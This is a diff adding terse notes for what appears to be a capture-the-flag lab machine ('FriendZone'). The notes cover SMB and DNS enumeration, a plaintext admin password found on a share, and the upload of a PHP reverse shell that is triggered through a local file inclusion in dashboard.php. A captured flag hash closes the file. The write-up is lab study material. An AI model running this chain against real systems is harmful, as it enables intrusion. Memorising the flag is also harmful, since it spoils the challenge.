@@ -1,0 +1,62 @@
+#10.10.10.123
+#PORT- 21(ftp), 22(ssh), 53(DNS), 80, 139(netbios-ssn), 443, 445(smbd 4.7.6)
+
+#nmap
+#dirb- /robots.txt, /wordpress
+10.10.10.123  -->  friendzoneportal.red   (found on webpage)
+-----------------------------------------------
+#port 445(smb) enumration
+smbmap -H 10.10.10.123
+	OR
+smbclient -L 10.10.10.123
+	OR
+enum4linux 10.10.10.123
+#found some shared folder --> files,general,development
+#found that 'files' is inside /etc folder
+#so others can also be inside /etc folder like /etc/general, /etc/Develoment
+
+smbclient \\\\10.10.10.123\\general
+#found creds.txt
+admin:WORKWORKHhallelujah@#
+
+smbclient \\\\10.10.10.123\\Development
+#upload reverse shell phpshell.php
+
+-----------------------------------------------
+
+#port 53 enumration
+nslookup
+>SERVER 10.10.10.123
+>friendzoneportal.red
+#its output shows that name is 'friendzoneportal.red'
+
+#checking dns zone transfer
+dig axfr friendzone.red @10.10.10.123
+#found subdomains
+- administrator1.friendzone.red      -->  /images
+- hr.friendzone.red		     
+- uploads.friendzone.red	     -->  /files
+
+#adding nameserver into resolv.conf because port 53 is open, so no need to add into /etc/hosts
+#add "nameserver 10.10.10.123" into /etc/resolv.conf  
+#add all these subdomains into /etc/hosts  
+
+#visit page 'https://administrator1.friendzone.red/'
+#USER= admin
+#PASSWD= WORKWORKHhallelujah@#
+
+#found new page '/dashboard.php'
+#access -->  'https://administrator1.friendzone.red/dashboard.php'
+
+#start listner on port 4444 acc. to phpshell.php file
+
+#access this to trigger phpshell.php file that was uploaded on smb server
+https://administrator1.friendzone.red/dashboard.php?image_id=a.jpg&pagename=/etc/Development/phpshell.php
+#intercept the data with burp and remove '.php' from the name of phpshell.php
+
+#Got shell
+
+
+#key
+a9ed20acecd6c5b6b52f474e15ae9a11
+
